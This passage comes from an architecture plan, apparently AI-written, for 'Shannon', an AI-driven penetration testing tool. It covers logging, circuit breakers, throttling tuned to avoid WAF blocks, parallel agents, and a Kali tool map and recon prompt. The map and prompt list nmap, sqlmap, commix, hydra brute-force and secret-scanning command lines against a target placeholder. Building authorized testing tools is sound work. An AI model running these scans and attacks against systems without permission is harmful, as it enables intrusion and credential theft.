      const e = stats.reliability.errors;
      summary += `### Errors\n`;
      summary += `- Total: ${e.total}\n`;
      summary += `- Retryable: ${e.retryable}\n`;
      summary += `- Fatal: ${e.fatal}\n\n`;
      
      summary += `### By Type\n`;
      for (const [type, count] of Object.entries(e.by_type)) {
        summary += `- ${type}: ${count}\n`;
      }
      summary += '\n';
    }
    
    return summary;
  }

  /**
   * Close logger
   */
  close() {
    this.eventLogStream.end();
    this.saveMetrics();
  }
}

export default UnifiedLogger;
```

### 3.4 Integration with Existing Code

**File**: `shannon.mjs` (modifications)

```javascript
import UnifiedLogger from './src/logging/unified-logger.js';

// Initialize logger
const logger = new UnifiedLogger(sessionId, targetRepoPath);

// Before each agent
const trace = logger.startTrace(agentName);
const span = trace.startSpan('agent_execution', { agent: agentName });

try {
  // Run agent...
  
  // Log tool execution
  logger.logEvent({
    type: 'tool_start',
    tool: 'nmap',
    target: targetUrl
  });
  
  const toolResult = await runTool('nmap', args);
  
  logger.logEvent({
    type: 'tool_end',
    tool: 'nmap',
    success: toolResult.success,
    duration: toolResult.duration
  });
  
  logger.recordMetric('tool_execution', {
    tool: 'nmap',
    duration: toolResult.duration,
    success: toolResult.success,
    outputSize: toolResult.output.length
  });
  
  // Log LLM call
  logger.logEvent({
    type: 'llm_call',
    model: 'claude-sonnet-4',
    inputTokens: 5000,
    outputTokens: 2000,
    cost: 0.05
  });
  
  logger.recordMetric('llm_call', {
    model: 'claude-sonnet-4',
    inputTokens: 5000,
    outputTokens: 2000,
    duration: 3500,
    cost: 0.05
  });
  
  // Log finding
  logger.logEvent({
    type: 'finding',
    vulnerability: 'SQL Injection',
    severity: 'critical',
    confidence: 'high',
    agent: agentName
  });
  
  logger.recordMetric('finding', {
    type: 'sql_injection',
    severity: 'critical',
    confidence: 'high',
    agent: agentName,
    validated: true
  });
  
  trace.endSpan(span, 'success');
  logger.endTrace('success');
  
} catch (error) {
  logger.logEvent({
    type: 'error',
    message: error.message,
    stack: error.stack,
    retryable: error.retryable,
    agent: agentName
  });
  
  logger.recordMetric('error', {
    type: error.type,
    message: error.message,
    stack: error.stack,
    retryable: error.retryable,
    agent: agentName
  });
  
  trace.endSpan(span, 'error', { error: error.message });
  logger.endTrace('error');
}

// At end of session
logger.close();
```

### 3.5 Log Analysis Tools

**File**: `scripts/analyze-logs.mjs`

```javascript
#!/usr/bin/env node

/**
 * Log Analysis Tool
 * 
 * Analyzes Shannon logs to identify:
 * - Bottlenecks (slowest operations)
 * - Cost drivers (expensive operations)
 * - Error patterns (common failures)
 * - Coverage gaps (untested areas)
 */

import fs from 'fs';
import path from 'path';
import chalk from 'chalk';

function analyzeEventLog(logPath) {
  const events = fs.readFileSync(logPath, 'utf-8')
    .split('\n')
    .filter(line => line.trim())
    .map(line => JSON.parse(line));
  
  console.log(chalk.blue('\n=== Event Analysis ===\n'));
  
  // Count events by type
  const eventCounts = {};
  for (const event of events) {
    eventCounts[event.type] = (eventCounts[event.type] || 0) + 1;
  }
  
  console.log('Event Distribution:');
  for (const [type, count] of Object.entries(eventCounts).sort((a, b) => b[1] - a[1])) {
    console.log(`  ${type}: ${count}`);
  }
  
  // Analyze HTTP requests
  const httpEvents = events.filter(e => e.type === 'http_request');
  if (httpEvents.length > 0) {
    console.log(chalk.blue('\n=== HTTP Request Analysis ===\n'));
    
    const statusCodes = {};
    const latencies = [];
    
    for (const req of httpEvents) {
      statusCodes[req.statusCode] = (statusCodes[req.statusCode] || 0) + 1;
      latencies.push(req.duration);
    }
    
    console.log('Status Codes:');
    for (const [code, count] of Object.entries(statusCodes).sort((a, b) => b[1] - a[1])) {
      const color = code >= 400 ? chalk.red : chalk.green;
      console.log(color(`  ${code}: ${count}`));
    }
    
    console.log('\nLatency Stats:');
    console.log(`  Min: ${Math.min(...latencies)}ms`);
    console.log(`  Max: ${Math.max(...latencies)}ms`);
    console.log(`  Avg: ${(latencies.reduce((a, b) => a + b, 0) / latencies.length).toFixed(0)}ms`);
    console.log(`  P95: ${percentile(latencies, 0.95).toFixed(0)}ms`);
  }
  
  // Analyze errors
  const errorEvents = events.filter(e => e.type === 'error');
  if (errorEvents.length > 0) {
    console.log(chalk.red('\n=== Error Analysis ===\n'));
    
    const errorTypes = {};
    for (const error of errorEvents) {
      const msg = error.message.split(':')[0]; // First part of error message
      errorTypes[msg] = (errorTypes[msg] || 0) + 1;
    }
    
    console.log('Most Common Errors:');
    for (const [msg, count] of Object.entries(errorTypes).sort((a, b) => b[1] - a[1]).slice(0, 5)) {
      console.log(chalk.red(`  ${count}x: ${msg}`));
    }
  }
  
  // Analyze findings
  const findingEvents = events.filter(e => e.type === 'finding');
  if (findingEvents.length > 0) {
    console.log(chalk.green('\n=== Findings Analysis ===\n'));
    
    const byType = {};
    const bySeverity = {};
    
    for (const finding of findingEvents) {
      byType[finding.vulnerability] = (byType[finding.vulnerability] || 0) + 1;
      bySeverity[finding.severity] = (bySeverity[finding.severity] || 0) + 1;
    }
    
    console.log('By Type:');
    for (const [type, count] of Object.entries(byType).sort((a, b) => b[1] - a[1])) {
      console.log(`  ${type}: ${count}`);
    }
    
    console.log('\nBy Severity:');
    for (const [severity, count] of Object.entries(bySeverity).sort((a, b) => b[1] - a[1])) {
      const color = severity === 'critical' ? chalk.red : 
                   severity === 'high' ? chalk.yellow : 
                   chalk.blue;
      console.log(color(`  ${severity}: ${count}`));
    }
  }
}

function analyzeTraces(tracesDir) {
  const traceFiles = fs.readdirSync(tracesDir).filter(f => f.endsWith('.json'));
  
  console.log(chalk.blue('\n=== Trace Analysis ===\n'));
  console.log(`Total Traces: ${traceFiles.length}\n`);
  
  const agentDurations = {};
  
  for (const file of traceFiles) {
    const trace = JSON.parse(fs.readFileSync(path.join(tracesDir, file), 'utf-8'));
    
    if (!agentDurations[trace.agentName]) {
      agentDurations[trace.agentName] = [];
    }
    agentDurations[trace.agentName].push(trace.duration);
  }
  
  console.log('Agent Execution Times:');
  for (const [agent, durations] of Object.entries(agentDurations).sort((a, b) => {
    const avgA = a[1].reduce((sum, d) => sum + d, 0) / a[1].length;
    const avgB = b[1].reduce((sum, d) => sum + d, 0) / b[1].length;
    return avgB - avgA;
  })) {
    const avg = durations.reduce((sum, d) => sum + d, 0) / durations.length;
    const max = Math.max(...durations);
    console.log(`  ${agent}: avg ${(avg / 1000).toFixed(1)}s, max ${(max / 1000).toFixed(1)}s (${durations.length} runs)`);
  }
}

function percentile(arr, p) {
  const sorted = arr.slice().sort((a, b) => a - b);
  const index = Math.ceil(sorted.length * p) - 1;
  return sorted[index];
}

// Main
const logsDir = process.argv[2] || './deliverables/logs';

if (!fs.existsSync(logsDir)) {
  console.error('Logs directory not found:', logsDir);
  process.exit(1);
}

const eventsLog = path.join(logsDir, 'events', 'events.ndjson');
const tracesDir = path.join(logsDir, 'traces');

if (fs.existsSync(eventsLog)) {
  analyzeEventLog(eventsLog);
}

if (fs.existsSync(tracesDir)) {
  analyzeTraces(tracesDir);
}
```

Usage:
```bash
chmod +x scripts/analyze-logs.mjs
./scripts/analyze-logs.mjs ./deliverables/logs
```

---

## 4. Architecture Improvements

### 4.1 Circuit Breaker Pattern

**Problem**: If a tool (e.g., nmap) is failing repeatedly, Shannon keeps retrying wastefully.

**Solution**: Implement circuit breaker to fail fast after N consecutive failures.

**File**: `src/resilience/circuit-breaker.js`

```javascript
/**
 * Circuit Breaker Pattern
 * 
 * Prevents cascading failures by "opening" circuit after repeated failures.
 * 
 * States:
 * - CLOSED: Normal operation, requests pass through
 * - OPEN: Failures detected, requests blocked (fail fast)
 * - HALF_OPEN: Testing if system recovered
 */

class CircuitBreaker {
  constructor(name, options = {}) {
    this.name = name;
    this.state = 'CLOSED';
    this.failureCount = 0;
    this.successCount = 0;
    this.lastFailureTime = null;
    
    // Configuration
    this.failureThreshold = options.failureThreshold || 5;
    this.successThreshold = options.successThreshold || 2;
    this.timeout = options.timeout || 60000; // 60 seconds
    this.onStateChange = options.onStateChange || (() => {});
  }

  /**
   * Execute function with circuit breaker protection
   */
  async execute(fn) {
    if (this.state === 'OPEN') {
      if (Date.now() - this.lastFailureTime > this.timeout) {
        this.setState('HALF_OPEN');
      } else {
        throw new Error(`Circuit breaker is OPEN for ${this.name}`);
      }
    }

    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }

  /**
   * Handle successful execution
   */
  onSuccess() {
    this.failureCount = 0;

    if (this.state === 'HALF_OPEN') {
      this.successCount++;
      if (this.successCount >= this.successThreshold) {
        this.setState('CLOSED');
        this.successCount = 0;
      }
    }
  }

  /**
   * Handle failed execution
   */
  onFailure() {
    this.failureCount++;
    this.lastFailureTime = Date.now();
    this.successCount = 0;

    if (this.failureCount >= this.failureThreshold) {
      this.setState('OPEN');
    }
  }

  /**
   * Change circuit state
   */
  setState(newState) {
    const oldState = this.state;
    this.state = newState;
    this.onStateChange(this.name, oldState, newState);
  }

  /**
   * Get current state
   */
  getState() {
    return this.state;
  }

  /**
   * Reset circuit breaker
   */
  reset() {
    this.state = 'CLOSED';
    this.failureCount = 0;
    this.successCount = 0;
    this.lastFailureTime = null;
  }
}

export default CircuitBreaker;
```

**Usage in tool-checker.js**:

```javascript
import CircuitBreaker from './resilience/circuit-breaker.js';

const breakers = {};

function getCircuitBreaker(toolName) {
  if (!breakers[toolName]) {
    breakers[toolName] = new CircuitBreaker(toolName, {
      failureThreshold: 3,
      timeout: 300000, // 5 minutes
      onStateChange: (name, oldState, newState) => {
        console.log(chalk.yellow(`⚡ Circuit breaker for ${name}: ${oldState} → ${newState}`));
      }
    });
  }
  return breakers[toolName];
}

async function runTool(toolName, args) {
  const breaker = getCircuitBreaker(toolName);
  
  try {
    return await breaker.execute(async () => {
      // Actual tool execution
      return await executeToolUnsafe(toolName, args);
    });
  } catch (error) {
    if (error.message.includes('Circuit breaker is OPEN')) {
      console.log(chalk.red(`❌ ${toolName} circuit is OPEN, skipping execution`));
      return { success: false, skipped: true, reason: 'circuit_open' };
    }
    throw error;
  }
}
```

### 4.2 Rate Limiting & Adaptive Throttling

**Problem**: Aggressive scanning can trigger WAF/IPS, getting IP blocked.

**Solution**: Adaptive rate limiting that slows down when detecting blocks.

**File**: `src/resilience/adaptive-throttle.js`

```javascript
/**
 * Adaptive Throttling
 * 
 * Automatically adjusts request rate based on responses:
 * - 429 Too Many Requests → Slow down
 * - 403 Forbidden (potential WAF) → Slow down
 * - 200 OK consistently → Speed up
 */

class AdaptiveThrottle {
  constructor(options = {}) {
    this.minDelay = options.minDelay || 100; // ms
    this.maxDelay = options.maxDelay || 5000; // ms
    this.currentDelay = options.initialDelay || 500; // ms
    
    this.increaseFactorOn403 = 2.0;
    this.increaseFactorOn429 = 3.0;
    this.decreaseFactorOnSuccess = 0.9;
    
    this.recentResponses = [];
    this.windowSize = 10;
  }

  /**
   * Wait before next request
   */
  async wait() {
    await new Promise(resolve => setTimeout(resolve, this.currentDelay));
  }

  /**
   * Record response and adjust throttle
   */
  recordResponse(statusCode) {
    this.recentResponses.push(statusCode);
    if (this.recentResponses.length > this.windowSize) {
      this.recentResponses.shift();
    }

    // Adjust delay based on response
    if (statusCode === 429) {
      this.currentDelay = Math.min(
        this.currentDelay * this.increaseFactorOn429,
        this.maxDelay
      );
      console.log(chalk.yellow(`⏳ Rate limit detected, increasing delay to ${this.currentDelay}ms`));
    } else if (statusCode === 403) {
      this.currentDelay = Math.min(
        this.currentDelay * this.increaseFactorOn403,
        this.maxDelay
      );
      console.log(chalk.yellow(`⚠️  403 detected (potential WAF), increasing delay to ${this.currentDelay}ms`));
    } else if (statusCode >= 200 && statusCode < 300) {
      // Success - can speed up slightly
      const recent403 = this.recentResponses.filter(c => c === 403).length;
      const recent429 = this.recentResponses.filter(c => c === 429).length;
      
      if (recent403 === 0 && recent429 === 0) {
        this.currentDelay = Math.max(
          this.currentDelay * this.decreaseFactorOnSuccess,
          this.minDelay
        );
      }
    }
  }

  /**
   * Get current delay
   */
  getCurrentDelay() {
    return this.currentDelay;
  }

  /**
   * Reset throttle
   */
  reset() {
    this.currentDelay = 500;
    this.recentResponses = [];
  }
}

export default AdaptiveThrottle;
```

**Usage**:

```javascript
import AdaptiveThrottle from './resilience/adaptive-throttle.js';

const throttle = new AdaptiveThrottle({
  minDelay: 100,
  maxDelay: 10000,
  initialDelay: 500
});

async function makeRequest(url) {
  await throttle.wait();
  
  const response = await fetch(url);
  throttle.recordResponse(response.status);
  
  return response;
}
```

### 4.3 Parallel Execution with Concurrency Control

**Problem**: Some phases run sequentially when they could be parallel.

**Solution**: Worker pool for controlled parallelism.

**File**: `src/concurrency/worker-pool.js`

```javascript
/**
 * Worker Pool for Controlled Parallelism
 * 
 * Executes tasks in parallel with configurable concurrency limit.
 */

class WorkerPool {
  constructor(concurrency = 5) {
    this.concurrency = concurrency;
    this.running = 0;
    this.queue = [];
  }

  /**
   * Execute function with concurrency control
   */
  async execute(fn) {
    while (this.running >= this.concurrency) {
      await new Promise(resolve => this.queue.push(resolve));
    }

    this.running++;

    try {
      return await fn();
    } finally {
      this.running--;
      if (this.queue.length > 0) {
        const resolve = this.queue.shift();
        resolve();
      }
    }
  }

  /**
   * Execute multiple tasks in parallel
   */
  async executeAll(tasks) {
    const results = [];
    
    for (const task of tasks) {
      results.push(this.execute(task));
    }

    return await Promise.all(results);
  }

  /**
   * Get pool stats
   */
  getStats() {
    return {
      concurrency: this.concurrency,
      running: this.running,
      queued: this.queue.length
    };
  }
}

export default WorkerPool;
```

**Usage in vulnerability phase**:

```javascript
import WorkerPool from './concurrency/worker-pool.js';

const pool = new WorkerPool(5); // Run 5 vulnerability agents in parallel

const vulnAgents = [
  'injection-vuln',
  'xss-vuln',
  'auth-vuln',
  'authz-vuln',
  'ssrf-vuln'
];

const results = await pool.executeAll(
  vulnAgents.map(agent => async () => {
    console.log(`Starting ${agent}...`);
    const result = await runAgent(agent);
    console.log(`Completed ${agent}`);
    return result;
  })
);
```

---

## 5. Kali Linux Integration

### 5.1 Kali Tool Mapping

Shannon can leverage all Kali tools. Here's a priority mapping:

**File**: `configs/kali-tools.yaml`

```yaml
kali_tools:
  # Reconnaissance
  reconnaissance:
    - name: nmap
      purpose: Port scanning
      priority: high
      command: "nmap -sV -sC -oX {output} {target}"
    
    - name: masscan
      purpose: Fast port scanning
      priority: medium
      command: "masscan -p1-65535 {target} --rate=1000 -oJ {output}"
    
    - name: subfinder
      purpose: Subdomain enumeration
      priority: high
      command: "subfinder -d {domain} -o {output}"
    
    - name: amass
      purpose: Attack surface mapping
      priority: high
      command: "amass enum -d {domain} -o {output}"
    
    - name: whatweb
      purpose: Tech fingerprinting
      priority: high
      command: "whatweb {target} --log-json={output}"
    
    - name: wappalyzer
      purpose: Tech stack detection
      priority: medium
      command: "wappalyzer {target} --output {output}"
  
  # Vulnerability Scanning
  vulnerability_scanning:
    - name: nuclei
      purpose: Template-based scanning
      priority: high
      command: "nuclei -u {target} -jsonl -o {output} -tags cves,exposures"
    
    - name: nikto
      purpose: Web server scanner
      priority: medium
      command: "nikto -h {target} -Format json -output {output}"
    
    - name: wpscan
      purpose: WordPress scanner
      priority: medium
      condition: "wordpress_detected"
      command: "wpscan --url {target} --format json --output {output}"
  
  # Content Discovery
  content_discovery:
    - name: feroxbuster
      purpose: Directory bruteforce
      priority: high
      command: "feroxbuster -u {target} -w {wordlist} -t 50 -d 3 --json -o {output}"
    
    - name: gobuster
      purpose: Directory/DNS bruteforce
      priority: medium
      command: "gobuster dir -u {target} -w {wordlist} -o {output}"
    
    - name: ffuf
      purpose: Web fuzzer
      priority: high
      command: "ffuf -w {wordlist} -u {target}/FUZZ -mc 200,204,301,302 -o {output} -of json"
    
    - name: dirsearch
      purpose: Web path scanner
      priority: medium
      command: "dirsearch -u {target} -e * -o {output}"
  
  # Parameter Discovery
  parameter_discovery:
    - name: arjun
      purpose: HTTP parameter discovery
      priority: high
      command: "arjun -u {target} --stable -oJ {output}"
    
    - name: paramspider
      purpose: Parameter mining
      priority: medium
      command: "paramspider -d {domain} --output {output}"
  
  # Exploitation
  exploitation:
    - name: sqlmap
      purpose: SQL injection
      priority: high
      command: "sqlmap -u {target} --batch --output-dir={output}"
    
    - name: commix
      purpose: Command injection
      priority: high
      command: "commix --url={target} --batch --output-dir={output}"
    
    - name: xsstrike
      purpose: XSS detection
      priority: high
      command: "xsstrike -u {target} --crawl --blind"
    
    - name: ssrf-detector
      purpose: SSRF detection
      priority: medium
      command: "python3 ssrf-detector.py -u {target}"
  
  # Authentication Testing
  authentication:
    - name: hydra
      purpose: Brute force
      priority: medium
      command: "hydra -L {userlist} -P {passlist} {target} {service} -o {output}"
    
    - name: medusa
      purpose: Brute force
      priority: low
      command: "medusa -h {target} -U {userlist} -P {passlist} -M {module}"
  
  # API Testing
  api_testing:
    - name: graphql-cop
      purpose: GraphQL security scanner
      priority: high
      condition: "graphql_detected"
      command: "graphql-cop -t {target} -o {output}"
    
    - name: kiterunner
      purpose: API endpoint discovery
      priority: high
      command: "kr scan {target} -w {wordlist} -o {output}"
  
  # Secret Detection
  secret_detection:
    - name: trufflehog
      purpose: Secret scanning
      priority: high
      command: "trufflehog filesystem {path} --json --no-verification > {output}"
    
    - name: gitleaks
      purpose: Git secret scanning
      priority: high
      command: "gitleaks detect --source {path} --report-path {output}"
    
    - name: shhgit
      purpose: Real-time secret detection
      priority: low
      command: "shhgit --local {path}"
  
  # SSL/TLS Testing
  ssl_testing:
    - name: sslyze
      purpose: SSL/TLS scanner
      priority: high
      command: "sslyze {target} --json_out {output}"
    
    - name: testssl
      purpose: TLS scanner
      priority: high
      command: "testssl.sh --jsonfile {output} {target}"
  
  # Reporting
  reporting:
    - name: pipal
      purpose: Password analysis
      priority: low
      command: "pipal {passfile} -o {output}"
```

### 5.2 Tool Auto-Detection

**File**: `src/kali-integration.js`

```javascript
/**
 * Kali Linux Tool Integration
 * 
 * Auto-detects available Kali tools and creates execution plans.
 */

import { $ } from 'zx';
import fs from 'fs';
import yaml from 'js-yaml';

async function detectKaliTools() {
  const config = yaml.load(fs.readFileSync('configs/kali-tools.yaml', 'utf8'));
  const available = [];
  const missing = [];

  for (const [category, tools] of Object.entries(config.kali_tools)) {
    for (const tool of tools) {
      try {
        await $`which ${tool.name}`.quiet();
        available.push({ ...tool, category });
      } catch {
        missing.push({ ...tool, category });
      }
    }
  }

  return { available, missing };
}

async function generateToolPlan(target, targetType) {
  const { available } = await detectKaliTools();
  
  const plan = {
    reconnaissance: [],
    vulnerability_scanning: [],
    content_discovery: [],
    exploitation: []
  };

  // Add all available high-priority tools
  for (const tool of available) {
    if (tool.priority === 'high') {
      plan[tool.category]?.push(tool);
    }
  }

  console.log('Generated tool execution plan:');
  for (const [phase, tools] of Object.entries(plan)) {
    if (tools.length > 0) {
      console.log(`\n${phase}:`);
      tools.forEach(t => console.log(`  - ${t.name}: ${t.purpose}`));
    }
  }

  return plan;
}

export { detectKaliTools, generateToolPlan };
```

### 5.3 Enhanced Pre-Recon with Kali Tools

**Update**: `prompts/pre-recon-code.txt`

```markdown
## Kali Linux Tool Execution

You have access to Kali Linux with a full suite of security tools. Use them strategically:

### Phase 1: Active Reconnaissance
Run these tools in parallel (if available):

```bash
# Network scanning
nmap -sV -sC -p- -oX deliverables/nmap.xml $TARGET

# Subdomain enumeration (if testing domain)
subfinder -d $DOMAIN -o deliverables/subdomains.txt
amass enum -d $DOMAIN -o deliverables/amass.txt

# Technology fingerprinting
whatweb $TARGET --aggression 3 --log-json=deliverables/whatweb.json
nuclei -u $TARGET -tags tech -jsonl -o deliverables/nuclei-tech.jsonl
```

### Phase 2: Content Discovery
```bash
# Directory brute force
feroxbuster -u $TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -t 50 -d 3 --json -o deliverables/ferox.json

# Additional fuzzing with ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u $TARGET/FUZZ \
  -mc 200,204,301,302,307,401,403 \
  -o deliverables/ffuf.json -of json

# Parameter discovery
arjun -u $TARGET --stable -oJ deliverables/params.json
```

### Phase 3: Vulnerability Scanning
```bash
# Template-based scanning
nuclei -u $TARGET \
  -tags cves,exposures,misconfiguration \
  -jsonl -o deliverables/nuclei-vulns.jsonl

# Web server scanning
nikto -h $TARGET -Format json -output deliverables/nikto.json

# SSL/TLS testing
sslyze $TARGET --json_out deliverables/sslyze.json
```

### Phase 4: Secret Detection (if source code available)
```bash
# Scan for secrets in code
trufflehog filesystem $REPO_PATH \
  --json --no-verification > deliverables/secrets.json

# Git history scanning
gitleaks detect --source $REPO_PATH \
  --report-path deliverables/gitleaks.json
```

### Tool Execution Strategy
- **Parallel Execution**: Run reconnaissance tools concurrently
- **Adaptive Throttling**: Slow down if 429/403 detected
- **Circuit Breaking**: Skip tools after 3 consecutive failures
- **Output Standardization**: All tool outputs saved to deliverables/
```

---

## 6. Implementation Roadmap

### Phase 1: Blackbox Foundation (Week 1-2)
- [ ] Add `mode: blackbox` configuration option
- [ ] Update all vulnerability agent prompts with blackbox testing guidance
- [ ] Create `prompts/shared/blackbox-checklist.txt`
- [ ] Update pre-recon to prioritize HTTP-based discovery
- [ ] Test against OWASP Juice Shop in blackbox mode

### Phase 2: Logging & Observability (Week 2-3)
- [ ] Implement `src/logging/trace.js` (distributed tracing)
- [ ] Implement `src/logging/metrics.js` (detailed metrics)
- [ ] Implement `src/logging/unified-logger.js` (single interface)
- [ ] Integrate logger into `shannon.mjs` and all agents
- [ ] Create `scripts/analyze-logs.mjs` (log analysis tool)
- [ ] Test logging overhead (should be <5% performance impact)

### Phase 3: Resilience Patterns (Week 3-4)
- [ ] Implement `src/resilience/circuit-breaker.js`
- [ ] Implement `src/resilience/adaptive-throttle.js`
- [ ] Integrate circuit breakers into tool execution
- [ ] Integrate adaptive throttling into HTTP requests
- [ ] Test against rate-limited targets

### Phase 4: Performance Optimization (Week 4-5)
- [ ] Implement `src/concurrency/worker-pool.js`
- [ ] Parallelize vulnerability analysis phase
- [ ] Parallelize exploitation phase
- [ ] Add performance profiling
- [ ] Benchmark: target 40% reduction in total scan time

### Phase 5: Kali Integration (Week 5-6)
- [ ] Create `configs/kali-tools.yaml`
- [ ] Implement `src/kali-integration.js`
- [ ] Update pre-recon to use Kali tool auto-detection
- [ ] Add tool-specific parsers for nuclei, nikto, sslyze
- [ ] Test on Kali Linux VM

### Phase 6: Documentation & Testing (Week 6-7)
- [ ] Update all documentation with new features
- [ ] Create tutorial: "Blackbox Testing with Shannon"
- [ ] Create tutorial: "Analyzing Shannon Logs"
- [ ] Add integration tests for logging
- [ ] Add benchmarks for performance
- [ ] Create sample reports showing new capabilities

---

## 7. Success Metrics

### Blackbox Testing
- **Detection Rate**: 70%+ of vulnerabilities found without source code (currently ~40%)
- **False Positive Rate**: <10% (currently ~15%)
- **HTTP Evidence**: 100% of findings have HTTP proof (currently ~60%)

### Logging & Observability
- **Trace Coverage**: 100% of agent executions traced
- **Log Searchability**: Find any finding in logs within 5 seconds
- **Performance Impact**: <5% overhead from logging
- **Debug Time**: 50% reduction in time to diagnose issues

### Resilience
- **Circuit Breaker Activation**: Prevent >90% of wasteful retries
- **Adaptive Throttling**: Avoid 0 IP blocks from rate limiting
- **Graceful Degradation**: 100% of tool failures handled gracefully

### Performance
- **Parallel Execution**: 40% reduction in total scan time
- **Tool Efficiency**: 30% fewer redundant tool invocations
- **Resource Usage**: CPU/memory usage stays within acceptable bounds

---

## 8. Sample Usage (After Implementation)

### Blackbox Scan
```bash
# Pure blackbox - no source code
./shannon.mjs https://target.com --mode blackbox --config blackbox.yaml

# See detailed logs
./scripts/analyze-logs.mjs ./deliverables/logs

# Check metrics
cat deliverables/logs/metrics/summary.txt
```

### Hybrid Scan
```bash
# Best of both worlds
./shannon.mjs https://target.com ./target-repo --mode hybrid

# Code informs testing, but HTTP validates everything
```

### Performance Tuning
```bash
# Adjust concurrency
./shannon.mjs https://target.com --concurrency 10

# Adjust throttling
./shannon.mjs https://target.com --min-delay 50 --max-delay 2000
```

---

## Conclusion

This architecture review provides a comprehensive plan to transform Shannon into a world-class blackbox penetration testing platform with enterprise-grade observability. The improvements focus on:

1. **Making it work in real-world scenarios** (blackbox testing)
2. **Making it debuggable and improvable** (detailed logging)
3. **Making it robust and reliable** (resilience patterns)
4. **Making it fast and efficient** (parallelism and smart tooling)

Estimated total implementation time: **6-7 weeks**

Estimated effort: **Full-time developer equivalent**

Would you like me to start implementing any specific component first?
